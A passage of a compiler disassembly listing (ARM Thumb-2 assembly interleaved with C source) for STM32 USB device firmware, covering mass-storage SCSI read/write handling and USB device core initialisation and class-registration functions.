 800ab08:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800ab0c:	60bb      	str	r3, [r7, #8]

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Read(lun, hmsc->bot_data,
 800ab0e:	687b      	ldr	r3, [r7, #4]
 800ab10:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800ab14:	687a      	ldr	r2, [r7, #4]
 800ab16:	33b0      	adds	r3, #176	; 0xb0
 800ab18:	009b      	lsls	r3, r3, #2
 800ab1a:	4413      	add	r3, r2
 800ab1c:	685b      	ldr	r3, [r3, #4]
 800ab1e:	691c      	ldr	r4, [r3, #16]
 800ab20:	68fb      	ldr	r3, [r7, #12]
 800ab22:	f103 0110 	add.w	r1, r3, #16
 800ab26:	68fb      	ldr	r3, [r7, #12]
 800ab28:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ab2c:	6eda      	ldr	r2, [r3, #108]	; 0x6c
                                                                    hmsc->scsi_blk_addr,
                                                                    (len / hmsc->scsi_blk_size)) < 0)
 800ab2e:	68fb      	ldr	r3, [r7, #12]
 800ab30:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ab34:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ab38:	4618      	mov	r0, r3
 800ab3a:	68bb      	ldr	r3, [r7, #8]
 800ab3c:	fbb3 f3f0 	udiv	r3, r3, r0
  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Read(lun, hmsc->bot_data,
 800ab40:	b29b      	uxth	r3, r3
 800ab42:	78f8      	ldrb	r0, [r7, #3]
 800ab44:	47a0      	blx	r4
 800ab46:	4603      	mov	r3, r0
 800ab48:	2b00      	cmp	r3, #0
 800ab4a:	da08      	bge.n	800ab5e <SCSI_ProcessRead+0x9e>
  {
    SCSI_SenseCode(pdev, lun, HARDWARE_ERROR, UNRECOVERED_READ_ERROR);
 800ab4c:	78f9      	ldrb	r1, [r7, #3]
 800ab4e:	2311      	movs	r3, #17
 800ab50:	2204      	movs	r2, #4
 800ab52:	6878      	ldr	r0, [r7, #4]
 800ab54:	f7ff fb0e 	bl	800a174 <SCSI_SenseCode>
    return -1;
 800ab58:	f04f 33ff 	mov.w	r3, #4294967295
 800ab5c:	e040      	b.n	800abe0 <SCSI_ProcessRead+0x120>
  }

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, hmsc->bot_data, len);
 800ab5e:	4b22      	ldr	r3, [pc, #136]	; (800abe8 <SCSI_ProcessRead+0x128>)
 800ab60:	7819      	ldrb	r1, [r3, #0]
 800ab62:	68fb      	ldr	r3, [r7, #12]
 800ab64:	f103 0210 	add.w	r2, r3, #16
 800ab68:	68bb      	ldr	r3, [r7, #8]
 800ab6a:	6878      	ldr	r0, [r7, #4]
 800ab6c:	f002 f8f4 	bl	800cd58 <USBD_LL_Transmit>

  hmsc->scsi_blk_addr += (len / hmsc->scsi_blk_size);
 800ab70:	68fb      	ldr	r3, [r7, #12]
 800ab72:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ab76:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800ab78:	68fb      	ldr	r3, [r7, #12]
 800ab7a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ab7e:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ab82:	4619      	mov	r1, r3
 800ab84:	68bb      	ldr	r3, [r7, #8]
 800ab86:	fbb3 f3f1 	udiv	r3, r3, r1
 800ab8a:	4413      	add	r3, r2
 800ab8c:	68fa      	ldr	r2, [r7, #12]
 800ab8e:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ab92:	66d3      	str	r3, [r2, #108]	; 0x6c
  hmsc->scsi_blk_len -= (len / hmsc->scsi_blk_size);
 800ab94:	68fb      	ldr	r3, [r7, #12]
 800ab96:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ab9a:	6f1a      	ldr	r2, [r3, #112]	; 0x70
 800ab9c:	68fb      	ldr	r3, [r7, #12]
 800ab9e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aba2:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800aba6:	4619      	mov	r1, r3
 800aba8:	68bb      	ldr	r3, [r7, #8]
 800abaa:	fbb3 f3f1 	udiv	r3, r3, r1
 800abae:	1ad3      	subs	r3, r2, r3
 800abb0:	68fa      	ldr	r2, [r7, #12]
 800abb2:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800abb6:	6713      	str	r3, [r2, #112]	; 0x70

  /* case 6 : Hi = Di */
  hmsc->csw.dDataResidue -= len;
 800abb8:	68fb      	ldr	r3, [r7, #12]
 800abba:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800abbe:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 800abc0:	68bb      	ldr	r3, [r7, #8]
 800abc2:	1ad3      	subs	r3, r2, r3
 800abc4:	68fa      	ldr	r2, [r7, #12]
 800abc6:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800abca:	6393      	str	r3, [r2, #56]	; 0x38

  if (hmsc->scsi_blk_len == 0U)
 800abcc:	68fb      	ldr	r3, [r7, #12]
 800abce:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800abd2:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800abd4:	2b00      	cmp	r3, #0
 800abd6:	d102      	bne.n	800abde <SCSI_ProcessRead+0x11e>
  {
    hmsc->bot_state = USBD_BOT_LAST_DATA_IN;
 800abd8:	68fb      	ldr	r3, [r7, #12]
 800abda:	2203      	movs	r2, #3
 800abdc:	721a      	strb	r2, [r3, #8]
  }

  return 0;
 800abde:	2300      	movs	r3, #0
}
 800abe0:	4618      	mov	r0, r3
 800abe2:	3714      	adds	r7, #20
 800abe4:	46bd      	mov	sp, r7
 800abe6:	bd90      	pop	{r4, r7, pc}
 800abe8:	2000010a 	.word	0x2000010a

0800abec <SCSI_ProcessWrite>:
  *         Handle Write Process
  * @param  lun: Logical unit number
  * @retval status
  */
static int8_t SCSI_ProcessWrite(USBD_HandleTypeDef *pdev, uint8_t lun)
{
 800abec:	b590      	push	{r4, r7, lr}
 800abee:	b085      	sub	sp, #20
 800abf0:	af00      	add	r7, sp, #0
 800abf2:	6078      	str	r0, [r7, #4]
 800abf4:	460b      	mov	r3, r1
 800abf6:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800abf8:	687b      	ldr	r3, [r7, #4]
 800abfa:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800abfe:	687b      	ldr	r3, [r7, #4]
 800ac00:	32b0      	adds	r2, #176	; 0xb0
 800ac02:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ac06:	60fb      	str	r3, [r7, #12]
  uint32_t len;

  if (hmsc == NULL)
 800ac08:	68fb      	ldr	r3, [r7, #12]
 800ac0a:	2b00      	cmp	r3, #0
 800ac0c:	d102      	bne.n	800ac14 <SCSI_ProcessWrite+0x28>
  {
    return -1;
 800ac0e:	f04f 33ff 	mov.w	r3, #4294967295
 800ac12:	e08e      	b.n	800ad32 <SCSI_ProcessWrite+0x146>
  }

  len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800ac14:	68fb      	ldr	r3, [r7, #12]
 800ac16:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac1a:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ac1c:	68fa      	ldr	r2, [r7, #12]
 800ac1e:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ac22:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800ac26:	fb02 f303 	mul.w	r3, r2, r3
 800ac2a:	60bb      	str	r3, [r7, #8]
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  len = MIN(len, MSC_MEDIA_PACKET);
 800ac2c:	68bb      	ldr	r3, [r7, #8]
 800ac2e:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800ac32:	bf28      	it	cs
 800ac34:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800ac38:	60bb      	str	r3, [r7, #8]

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Write(lun, hmsc->bot_data,
 800ac3a:	687b      	ldr	r3, [r7, #4]
 800ac3c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800ac40:	687a      	ldr	r2, [r7, #4]
 800ac42:	33b0      	adds	r3, #176	; 0xb0
 800ac44:	009b      	lsls	r3, r3, #2
 800ac46:	4413      	add	r3, r2
 800ac48:	685b      	ldr	r3, [r3, #4]
 800ac4a:	695c      	ldr	r4, [r3, #20]
 800ac4c:	68fb      	ldr	r3, [r7, #12]
 800ac4e:	f103 0110 	add.w	r1, r3, #16
 800ac52:	68fb      	ldr	r3, [r7, #12]
 800ac54:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac58:	6eda      	ldr	r2, [r3, #108]	; 0x6c
                                                                     hmsc->scsi_blk_addr,
                                                                     (len / hmsc->scsi_blk_size)) < 0)
 800ac5a:	68fb      	ldr	r3, [r7, #12]
 800ac5c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac60:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ac64:	4618      	mov	r0, r3
 800ac66:	68bb      	ldr	r3, [r7, #8]
 800ac68:	fbb3 f3f0 	udiv	r3, r3, r0
  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Write(lun, hmsc->bot_data,
 800ac6c:	b29b      	uxth	r3, r3
 800ac6e:	78f8      	ldrb	r0, [r7, #3]
 800ac70:	47a0      	blx	r4
 800ac72:	4603      	mov	r3, r0
 800ac74:	2b00      	cmp	r3, #0
 800ac76:	da08      	bge.n	800ac8a <SCSI_ProcessWrite+0x9e>
  {
    SCSI_SenseCode(pdev, lun, HARDWARE_ERROR, WRITE_FAULT);
 800ac78:	78f9      	ldrb	r1, [r7, #3]
 800ac7a:	2303      	movs	r3, #3
 800ac7c:	2204      	movs	r2, #4
 800ac7e:	6878      	ldr	r0, [r7, #4]
 800ac80:	f7ff fa78 	bl	800a174 <SCSI_SenseCode>
    return -1;
 800ac84:	f04f 33ff 	mov.w	r3, #4294967295
 800ac88:	e053      	b.n	800ad32 <SCSI_ProcessWrite+0x146>
  }

  hmsc->scsi_blk_addr += (len / hmsc->scsi_blk_size);
 800ac8a:	68fb      	ldr	r3, [r7, #12]
 800ac8c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac90:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800ac92:	68fb      	ldr	r3, [r7, #12]
 800ac94:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac98:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ac9c:	4619      	mov	r1, r3
 800ac9e:	68bb      	ldr	r3, [r7, #8]
 800aca0:	fbb3 f3f1 	udiv	r3, r3, r1
 800aca4:	4413      	add	r3, r2
 800aca6:	68fa      	ldr	r2, [r7, #12]
 800aca8:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800acac:	66d3      	str	r3, [r2, #108]	; 0x6c
  hmsc->scsi_blk_len -= (len / hmsc->scsi_blk_size);
 800acae:	68fb      	ldr	r3, [r7, #12]
 800acb0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800acb4:	6f1a      	ldr	r2, [r3, #112]	; 0x70
 800acb6:	68fb      	ldr	r3, [r7, #12]
 800acb8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800acbc:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800acc0:	4619      	mov	r1, r3
 800acc2:	68bb      	ldr	r3, [r7, #8]
 800acc4:	fbb3 f3f1 	udiv	r3, r3, r1
 800acc8:	1ad3      	subs	r3, r2, r3
 800acca:	68fa      	ldr	r2, [r7, #12]
 800accc:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800acd0:	6713      	str	r3, [r2, #112]	; 0x70

  /* case 12 : Ho = Do */
  hmsc->csw.dDataResidue -= len;
 800acd2:	68fb      	ldr	r3, [r7, #12]
 800acd4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800acd8:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 800acda:	68bb      	ldr	r3, [r7, #8]
 800acdc:	1ad3      	subs	r3, r2, r3
 800acde:	68fa      	ldr	r2, [r7, #12]
 800ace0:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ace4:	6393      	str	r3, [r2, #56]	; 0x38

  if (hmsc->scsi_blk_len == 0U)
 800ace6:	68fb      	ldr	r3, [r7, #12]
 800ace8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800acec:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800acee:	2b00      	cmp	r3, #0
 800acf0:	d104      	bne.n	800acfc <SCSI_ProcessWrite+0x110>
  {
    MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 800acf2:	2100      	movs	r1, #0
 800acf4:	6878      	ldr	r0, [r7, #4]
 800acf6:	f7fe fc53 	bl	80095a0 <MSC_BOT_SendCSW>
 800acfa:	e019      	b.n	800ad30 <SCSI_ProcessWrite+0x144>
  }
  else
  {
    len = MIN((hmsc->scsi_blk_len * hmsc->scsi_blk_size), MSC_MEDIA_PACKET);
 800acfc:	68fb      	ldr	r3, [r7, #12]
 800acfe:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad02:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ad04:	68fa      	ldr	r2, [r7, #12]
 800ad06:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ad0a:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800ad0e:	fb02 f303 	mul.w	r3, r2, r3
 800ad12:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800ad16:	bf28      	it	cs
 800ad18:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800ad1c:	60bb      	str	r3, [r7, #8]

    /* Prepare EP to Receive next packet */
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800ad1e:	4b07      	ldr	r3, [pc, #28]	; (800ad3c <SCSI_ProcessWrite+0x150>)
 800ad20:	7819      	ldrb	r1, [r3, #0]
 800ad22:	68fb      	ldr	r3, [r7, #12]
 800ad24:	f103 0210 	add.w	r2, r3, #16
 800ad28:	68bb      	ldr	r3, [r7, #8]
 800ad2a:	6878      	ldr	r0, [r7, #4]
 800ad2c:	f002 f84c 	bl	800cdc8 <USBD_LL_PrepareReceive>
  }

  return 0;
 800ad30:	2300      	movs	r3, #0
}
 800ad32:	4618      	mov	r0, r3
 800ad34:	3714      	adds	r7, #20
 800ad36:	46bd      	mov	sp, r7
 800ad38:	bd90      	pop	{r4, r7, pc}
 800ad3a:	bf00      	nop
 800ad3c:	2000010b 	.word	0x2000010b

0800ad40 <SCSI_UpdateBotData>:
  * @param  length: Data length
  * @retval status
  */
static int8_t SCSI_UpdateBotData(USBD_MSC_BOT_HandleTypeDef *hmsc,
                                 uint8_t *pBuff, uint16_t length)
{
 800ad40:	b480      	push	{r7}
 800ad42:	b087      	sub	sp, #28
 800ad44:	af00      	add	r7, sp, #0
 800ad46:	60f8      	str	r0, [r7, #12]
 800ad48:	60b9      	str	r1, [r7, #8]
 800ad4a:	4613      	mov	r3, r2
 800ad4c:	80fb      	strh	r3, [r7, #6]
  uint16_t len = length;
 800ad4e:	88fb      	ldrh	r3, [r7, #6]
 800ad50:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800ad52:	68fb      	ldr	r3, [r7, #12]
 800ad54:	2b00      	cmp	r3, #0
 800ad56:	d102      	bne.n	800ad5e <SCSI_UpdateBotData+0x1e>
  {
    return -1;
 800ad58:	f04f 33ff 	mov.w	r3, #4294967295
 800ad5c:	e013      	b.n	800ad86 <SCSI_UpdateBotData+0x46>
  }

  hmsc->bot_data_length = len;
 800ad5e:	8afa      	ldrh	r2, [r7, #22]
 800ad60:	68fb      	ldr	r3, [r7, #12]
 800ad62:	60da      	str	r2, [r3, #12]

  while (len != 0U)
 800ad64:	e00b      	b.n	800ad7e <SCSI_UpdateBotData+0x3e>
  {
    len--;
 800ad66:	8afb      	ldrh	r3, [r7, #22]
 800ad68:	3b01      	subs	r3, #1
 800ad6a:	82fb      	strh	r3, [r7, #22]
    hmsc->bot_data[len] = pBuff[len];
 800ad6c:	8afb      	ldrh	r3, [r7, #22]
 800ad6e:	68ba      	ldr	r2, [r7, #8]
 800ad70:	441a      	add	r2, r3
 800ad72:	8afb      	ldrh	r3, [r7, #22]
 800ad74:	7811      	ldrb	r1, [r2, #0]
 800ad76:	68fa      	ldr	r2, [r7, #12]
 800ad78:	4413      	add	r3, r2
 800ad7a:	460a      	mov	r2, r1
 800ad7c:	741a      	strb	r2, [r3, #16]
  while (len != 0U)
 800ad7e:	8afb      	ldrh	r3, [r7, #22]
 800ad80:	2b00      	cmp	r3, #0
 800ad82:	d1f0      	bne.n	800ad66 <SCSI_UpdateBotData+0x26>
  }

  return 0;
 800ad84:	2300      	movs	r3, #0
}
 800ad86:	4618      	mov	r0, r3
 800ad88:	371c      	adds	r7, #28
 800ad8a:	46bd      	mov	sp, r7
 800ad8c:	f85d 7b04 	ldr.w	r7, [sp], #4
 800ad90:	4770      	bx	lr

0800ad92 <USBD_Init>:
  * @param  id: Low level core index
  * @retval None
  */
USBD_StatusTypeDef USBD_Init(USBD_HandleTypeDef *pdev,
                             USBD_DescriptorsTypeDef *pdesc, uint8_t id)
{
 800ad92:	b580      	push	{r7, lr}
 800ad94:	b086      	sub	sp, #24
 800ad96:	af00      	add	r7, sp, #0
 800ad98:	60f8      	str	r0, [r7, #12]
 800ad9a:	60b9      	str	r1, [r7, #8]
 800ad9c:	4613      	mov	r3, r2
 800ad9e:	71fb      	strb	r3, [r7, #7]
  USBD_StatusTypeDef ret;

  /* Check whether the USB Host handle is valid */
  if (pdev == NULL)
 800ada0:	68fb      	ldr	r3, [r7, #12]
 800ada2:	2b00      	cmp	r3, #0
 800ada4:	d101      	bne.n	800adaa <USBD_Init+0x18>
  {
#if (USBD_DEBUG_LEVEL > 1U)
    USBD_ErrLog("Invalid Device handle");
#endif /* (USBD_DEBUG_LEVEL > 1U) */
    return USBD_FAIL;
 800ada6:	2303      	movs	r3, #3
 800ada8:	e01f      	b.n	800adea <USBD_Init+0x58>
    pdev->NumClasses = 0;
    pdev->classId = 0;
  }
#else
  /* Unlink previous class*/
  pdev->pClass[0] = NULL;
 800adaa:	68fb      	ldr	r3, [r7, #12]
 800adac:	2200      	movs	r2, #0
 800adae:	f8c3 22b8 	str.w	r2, [r3, #696]	; 0x2b8
  pdev->pUserData[0] = NULL;
 800adb2:	68fb      	ldr	r3, [r7, #12]
 800adb4:	2200      	movs	r2, #0
 800adb6:	f8c3 22c4 	str.w	r2, [r3, #708]	; 0x2c4
#endif /* USE_USBD_COMPOSITE */

  pdev->pConfDesc = NULL;
 800adba:	68fb      	ldr	r3, [r7, #12]
 800adbc:	2200      	movs	r2, #0
 800adbe:	f8c3 22d0 	str.w	r2, [r3, #720]	; 0x2d0

  /* Assign USBD Descriptors */
  if (pdesc != NULL)
 800adc2:	68bb      	ldr	r3, [r7, #8]
 800adc4:	2b00      	cmp	r3, #0
 800adc6:	d003      	beq.n	800add0 <USBD_Init+0x3e>
  {
    pdev->pDesc = pdesc;
 800adc8:	68fb      	ldr	r3, [r7, #12]
 800adca:	68ba      	ldr	r2, [r7, #8]
 800adcc:	f8c3 22b4 	str.w	r2, [r3, #692]	; 0x2b4
  }

  /* Set Device initial State */
  pdev->dev_state = USBD_STATE_DEFAULT;
 800add0:	68fb      	ldr	r3, [r7, #12]
 800add2:	2201      	movs	r2, #1
 800add4:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  pdev->id = id;
 800add8:	68fb      	ldr	r3, [r7, #12]
 800adda:	79fa      	ldrb	r2, [r7, #7]
 800addc:	701a      	strb	r2, [r3, #0]

  /* Initialize low level driver */
  ret = USBD_LL_Init(pdev);
 800adde:	68f8      	ldr	r0, [r7, #12]
 800ade0:	f001 fdb6 	bl	800c950 <USBD_LL_Init>
 800ade4:	4603      	mov	r3, r0
 800ade6:	75fb      	strb	r3, [r7, #23]

  return ret;
 800ade8:	7dfb      	ldrb	r3, [r7, #23]
}
 800adea:	4618      	mov	r0, r3
 800adec:	3718      	adds	r7, #24
 800adee:	46bd      	mov	sp, r7
 800adf0:	bd80      	pop	{r7, pc}

0800adf2 <USBD_RegisterClass>:
  * @param  pDevice : Device Handle
  * @param  pclass: Class handle
  * @retval USBD Status
  */
USBD_StatusTypeDef USBD_RegisterClass(USBD_HandleTypeDef *pdev, USBD_ClassTypeDef *pclass)
{
 800adf2:	b580      	push	{r7, lr}
 800adf4:	b084      	sub	sp, #16
 800adf6:	af00      	add	r7, sp, #0
 800adf8:	6078      	str	r0, [r7, #4]
 800adfa:	6039      	str	r1, [r7, #0]
  uint16_t len = 0U;
 800adfc:	2300      	movs	r3, #0
 800adfe:	81fb      	strh	r3, [r7, #14]

  if (pclass == NULL)
 800ae00:	683b      	ldr	r3, [r7, #0]
 800ae02:	2b00      	cmp	r3, #0
 800ae04:	d101      	bne.n	800ae0a <USBD_RegisterClass+0x18>
  {
#if (USBD_DEBUG_LEVEL > 1U)
    USBD_ErrLog("Invalid Class handle");
#endif /* (USBD_DEBUG_LEVEL > 1U) */
    return USBD_FAIL;
 800ae06:	2303      	movs	r3, #3
 800ae08:	e025      	b.n	800ae56 <USBD_RegisterClass+0x64>
  }

  /* link the class to the USB Device handle */
  pdev->pClass[0] = pclass;
 800ae0a:	687b      	ldr	r3, [r7, #4]
 800ae0c:	683a      	ldr	r2, [r7, #0]
 800ae0e:	f8c3 22b8 	str.w	r2, [r3, #696]	; 0x2b8
  if (pdev->pClass[pdev->classId]->GetHSConfigDescriptor != NULL)
  {
    pdev->pConfDesc = (void *)pdev->pClass[pdev->classId]->GetHSConfigDescriptor(&len);
  }
#else /* Default USE_USB_FS */
  if (pdev->pClass[pdev->classId]->GetFSConfigDescriptor != NULL)
 800ae12:	687b      	ldr	r3, [r7, #4]
 800ae14:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ae18:	687b      	ldr	r3, [r7, #4]
 800ae1a:	32ae      	adds	r2, #174	; 0xae
 800ae1c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ae20:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800ae22:	2b00      	cmp	r3, #0
 800ae24:	d00f      	beq.n	800ae46 <USBD_RegisterClass+0x54>
  {
    pdev->pConfDesc = (void *)pdev->pClass[pdev->classId]->GetFSConfigDescriptor(&len);
 800ae26:	687b      	ldr	r3, [r7, #4]
 800ae28:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ae2c:	687b      	ldr	r3, [r7, #4]
 800ae2e:	32ae      	adds	r2, #174	; 0xae
 800ae30:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ae34:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800ae36:	f107 020e 	add.w	r2, r7, #14
 800ae3a:	4610      	mov	r0, r2
 800ae3c:	4798      	blx	r3
 800ae3e:	4602      	mov	r2, r0
 800ae40:	687b      	ldr	r3, [r7, #4]
 800ae42:	f8c3 22d0 	str.w	r2, [r3, #720]	; 0x2d0
  }
#endif /* USE_USB_FS */

  /* Increment the NumClasses */
  pdev->NumClasses ++;
 800ae46:	687b      	ldr	r3, [r7, #4]
 800ae48:	f8d3 32d8 	ldr.w	r3, [r3, #728]	; 0x2d8
 800ae4c:	1c5a      	adds	r2, r3, #1
 800ae4e:	687b      	ldr	r3, [r7, #4]
 800ae50:	f8c3 22d8 	str.w	r2, [r3, #728]	; 0x2d8

  return USBD_OK;
 800ae54:	2300      	movs	r3, #0
}
 800ae56:	4618      	mov	r0, r3
 800ae58:	3710      	adds	r7, #16
 800ae5a:	46bd      	mov	sp, r7
 800ae5c:	bd80      	pop	{r7, pc}

0800ae5e <USBD_Start>:
  *         Start the USB Device Core.
  * @param  pdev: Device Handle
  * @retval USBD Status
  */
USBD_StatusTypeDef USBD_Start(USBD_HandleTypeDef *pdev)
{
 800ae5e:	b580      	push	{r7, lr}
 800ae60:	b082      	sub	sp, #8
 800ae62:	af00      	add	r7, sp, #0
 800ae64:	6078      	str	r0, [r7, #4]
#ifdef USE_USBD_COMPOSITE
  pdev->classId = 0U;
#endif /* USE_USBD_COMPOSITE */

  /* Start the low level driver  */
  return USBD_LL_Start(pdev);
 800ae66:	6878      	ldr	r0, [r7, #4]
 800ae68:	f001 fdca 	bl	800ca00 <USBD_LL_Start>
 800ae6c:	4603      	mov	r3, r0
}
 800ae6e:	4618      	mov	r0, r3
 800ae70:	3708      	adds	r7, #8
 800ae72:	46bd      	mov	sp, r7
 800ae74:	bd80      	pop	{r7, pc}

0800ae76 <USBD_RunTestMode>:
  *         Launch test mode process
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_RunTestMode(USBD_HandleTypeDef *pdev)
{
 800ae76:	b480      	push	{r7}
 800ae78:	b083      	sub	sp, #12
 800ae7a:	af00      	add	r7, sp, #0
 800ae7c:	6078      	str	r0, [r7, #4]
  return ret;
#else
  /* Prevent unused argument compilation warning */
  UNUSED(pdev);

  return USBD_OK;
 800ae7e:	2300      	movs	r3, #0
#endif /* USBD_HS_TESTMODE_ENABLE */
}
 800ae80:	4618      	mov	r0, r3
 800ae82:	370c      	adds	r7, #12
 800ae84:	46bd      	mov	sp, r7
 800ae86:	f85d 7b04 	ldr.w	r7, [sp], #4
 800ae8a:	4770      	bx	lr

0800ae8c <USBD_SetClassConfig>:
  * @param  cfgidx: configuration index
  * @retval status
  */

USBD_StatusTypeDef USBD_SetClassConfig(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800ae8c:	b580      	push	{r7, lr}
 800ae8e:	b084      	sub	sp, #16
 800ae90:	af00      	add	r7, sp, #0
 800ae92:	6078      	str	r0, [r7, #4]
 800ae94:	460b      	mov	r3, r1
 800ae96:	70fb      	strb	r3, [r7, #3]
  USBD_StatusTypeDef ret = USBD_OK;
 800ae98:	2300      	movs	r3, #0
 800ae9a:	73fb      	strb	r3, [r7, #15]
        }
      }
    }
  }
#else
  if (pdev->pClass[0] != NULL)
 800ae9c:	687b      	ldr	r3, [r7, #4]
 800ae9e:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800aea2:	2b00      	cmp	r3, #0
 800aea4:	d009      	beq.n	800aeba <USBD_SetClassConfig+0x2e>
  {
    /* Set configuration and Start the Class */
    ret = (USBD_StatusTypeDef)pdev->pClass[0]->Init(pdev, cfgidx);
 800aea6:	687b      	ldr	r3, [r7, #4]
 800aea8:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800aeac:	681b      	ldr	r3, [r3, #0]
 800aeae:	78fa      	ldrb	r2, [r7, #3]
 800aeb0:	4611      	mov	r1, r2
 800aeb2:	6878      	ldr	r0, [r7, #4]
 800aeb4:	4798      	blx	r3
 800aeb6:	4603      	mov	r3, r0
 800aeb8:	73fb      	strb	r3, [r7, #15]
  }
#endif /* USE_USBD_COMPOSITE */

  return ret;
 800aeba:	7bfb      	ldrb	r3, [r7, #15]
}
 800aebc:	4618      	mov	r0, r3
 800aebe:	3710      	adds	r7, #16
 800aec0:	46bd      	mov	sp, r7
 800aec2:	bd80      	pop	{r7, pc}

0800aec4 <USBD_ClrClassConfig>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status: USBD_StatusTypeDef
  */
USBD_StatusTypeDef USBD_ClrClassConfig(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800aec4:	b580      	push	{r7, lr}
 800aec6:	b084      	sub	sp, #16
 800aec8:	af00      	add	r7, sp, #0
 800aeca:	6078      	str	r0, [r7, #4]
 800aecc:	460b      	mov	r3, r1
 800aece:	70fb      	strb	r3, [r7, #3]
  USBD_StatusTypeDef ret = USBD_OK;
 800aed0:	2300      	movs	r3, #0
 800aed2:	73fb      	strb	r3, [r7, #15]
      }
    }
  }
#else
  /* Clear configuration  and De-initialize the Class process */
  if (pdev->pClass[0]->DeInit(pdev, cfgidx) != 0U)
 800aed4:	687b      	ldr	r3, [r7, #4]
 800aed6:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800aeda:	685b      	ldr	r3, [r3, #4]
 800aedc:	78fa      	ldrb	r2, [r7, #3]
 800aede:	4611      	mov	r1, r2
 800aee0:	6878      	ldr	r0, [r7, #4]
 800aee2:	4798      	blx	r3
 800aee4:	4603      	mov	r3, r0
 800aee6:	2b00      	cmp	r3, #0
 800aee8:	d001      	beq.n	800aeee <USBD_ClrClassConfig+0x2a>
  {
    ret = USBD_FAIL;
 800aeea:	2303      	movs	r3, #3
 800aeec:	73fb      	strb	r3, [r7, #15]
  }
#endif /* USE_USBD_COMPOSITE */

  return ret;
 800aeee:	7bfb      	ldrb	r3, [r7, #15]
}
 800aef0:	4618      	mov	r0, r3
 800aef2:	3710      	adds	r7, #16
 800aef4:	46bd      	mov	sp, r7
 800aef6:	bd80      	pop	{r7, pc}

